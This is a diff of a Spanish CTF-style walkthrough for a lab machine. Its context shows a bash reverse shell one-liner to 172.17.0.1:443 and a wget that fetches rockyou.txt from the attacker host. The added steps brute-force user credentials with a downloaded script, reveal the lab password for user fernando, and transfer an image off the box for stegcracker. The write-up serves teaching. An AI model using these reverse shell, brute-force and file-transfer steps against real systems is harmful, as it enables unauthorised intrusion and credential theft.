@@ -73,7 +73,7 @@ bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 
 Y finalmente tendremos acceso a la máquina.
 
-## Paso N6: Cambiando de usuarios
+## Paso N6: Preparando herramientas necesarias
 Una vez dentro, en el directorio ```/home/``` veremos que tenemos 4 usuarios, por lo que tendremos que buscar acceder a uno de ellos. Obviaremos las técnicas usuales de búsqueda de credenciales ya que ninguna se aplica en esta máquina.
 <img width="485" height="150" alt="image" src="https://github.com/user-attachments/assets/5a23eb8f-6567-4cd0-93db-daf154f8bf49" />
 
@@ -94,4 +94,30 @@ wget http://172.17.0.1:8000/rockyou.txt
 ```
 <img width="669" height="533" alt="image" src="https://github.com/user-attachments/assets/54b8dfbc-a0c3-40a8-a6eb-4ecdcbabf03b" />
 
+## Paso N7: Fuerza bruta con Kforce
+Una vez ya tengamos [KaiteForce](https://github.com/kaiteMuak/KaiteForce) y ```rockyou.txt``` en la máquina victima, podemos hacer fuerza bruta dándole permisos
+```
+chmod +x kforce.sh
+```
+y ejecutando 
+```
+./kforce.sh
+```
+<img width="508" height="380" alt="image" src="https://github.com/user-attachments/assets/7f224c8d-a3fc-47cf-8796-104debb07724" />
+
+Vemos que las credenciales del usuario fernando son: ```fernando:chocolate``` por lo que ahora podemos acceder.
+
+## Paso N8: Accediendo a usuario x
+Una vez ya dentro del usuario ```fernando``` podemos ver que en su ```/home/fernando``` hay una imágen, por lo que la pasamos a la máquina atacante abriendo un servidor 
+```
+python3 -m http.server 8000
+```
+y pasando a nuestra máquina con:
+```
+wget http://172.17.0.2:8000/dragon-medieval.jpeg
+```
+<img width="664" height="257" alt="image" src="https://github.com/user-attachments/assets/d4ae14d5-6ce6-4fec-8e63-648e6b73561f" />
+
+y una vez la tengamos en n uestra máquina, usaremos ```stegcracker```
+<img width="665" height="305" alt="image" src="https://github.com/user-attachments/assets/6b9a639b-4e88-4589-87b5-99d567f45013" />
 
